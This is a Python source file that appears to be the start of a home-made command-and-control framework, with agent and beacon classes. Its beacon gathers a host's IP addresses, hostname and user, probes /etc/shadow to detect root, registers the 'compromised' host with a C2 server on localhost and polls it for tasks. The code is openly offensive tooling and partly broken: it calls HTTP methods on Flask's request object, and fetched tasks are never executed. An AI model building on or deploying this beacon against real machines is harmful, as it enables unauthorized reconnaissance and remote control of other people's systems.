import os
import subprocess
import re
import socket
from flask import request, jsonify
import uuid


#######################################################################################
#######################################################################################
###########################AGENT FUNCTIONS############################################
#######################################################################################
#######################################################################################


class Agent():
    def __init__(self, name, id, key, path, config):
        self.name = name
        self.id = id
        self.key = key
        self.path = path
        self.config = config

    def get_task_file(self):
        return "/home/exe/data/tasks"

    def get_beacon_path(self):
        return "/home/exe/data/beacons"

    def read_task(self):
        task_file = self.get_task_file()

        if os.path.exists(task_file):    
            with open(task_file, "r") as f:
                task = f.read()
                if task.strip():
                    self.clear_task(task_file)
            return (task, 200)
        return ('', 204)

    def clear_task(self, task_file):
        with open(task_file, "w") as f:
            f.write("0")

    def write_task(self, task):
        task_file = self.get_task_file()
        reflected_output = f"{self.name} has tasked to execute {task}"

        if os.path.exists(task_file):
            with open(task_file, "w") as f:
                f.write(task)

        return (reflected_output, 200)
    
#######################################################################################
#######################################################################################
###########################BEACON FUNCTIONS############################################
#######################################################################################
#######################################################################################

class Beacon():
    def __init__(self, agent: Agent, beacon_id =None):
        self.remote_ip = self.get_ip()[0]
        self.remote_hostname = self.get_hostname()
        self.remote_permissions = self.get_permissions()
        self.beacon_write_path = agent.get_beacon_path()
        self.beacon_id = beacon_id if beacon_id else str(uuid.uuid4())

    def get_ip(self):
        ip_addresses = []
        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
        ip_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)')
        ip_addresses = ip_pattern.findall(result.stdout)
        return ip_addresses

    def get_hostname(self):
        return socket.gethostname()

    def get_permissions(self):
        root = False
        name_result = subprocess.run(['whoami'], capture_output=True, text=True, check=True)
        name = name_result.stdout.strip()
        if "root" in name:
            root = True
        else:
            check_for_root = subprocess.run(['cat', '/etc/shadow'], capture_output=True, text=True, check=True)
            if "Permission denied" in check_for_root.stderr:
                pass
            else:
                root = True
        return name, root

    def write_new_beacon(self):
        write_path = self.beacon_write_path
        reflected_output = f"{self.remote_hostname}, {self.remote_ip}, {self.remote_permissions}"

        try:
            with open(write_path, "a") as f:
                f.write(reflected_output)
        except OSError as e:
            print(f"Error writing beacon file {f}")
            return None

        return reflected_output

    def register_beacon(self):
        compromised_ip = self.remote_ip
        compromised_hostname = self.remote_hostname
        compromised_permissions = self.remote_permissions

        r = request.post("http://localhost:5000/c2/register_beacon",
                         json={"remote_ip": compromised_ip,
                               "remote_hostname": compromised_hostname,
                               "remote_permissions": compromised_permissions})
        
        if r.status_code == 200:
            print("Beacon registered", r.json().get("message"))
        else:
            print(f"Error: {r.status_code}, {r.text}")

        return compromised_hostname, compromised_ip, compromised_permissions

    def fetch_tasks(self):
        if not self.beacon_id:
            print("Beacon is not registered!")
            return
        r = request.get(f"http://localhost:5000/c2/read_task?beacon_id={self.beacon_id}")

        if r.status_code == 200:
            tasks = r.json().get('task')
            if tasks:
                print(f"Tasks for beacon {self.beacon_id}: {tasks}")
            else:
                print("No tasks assigned yet")
        else:
            print(f"Error fetching tasks: {r.status_code}")
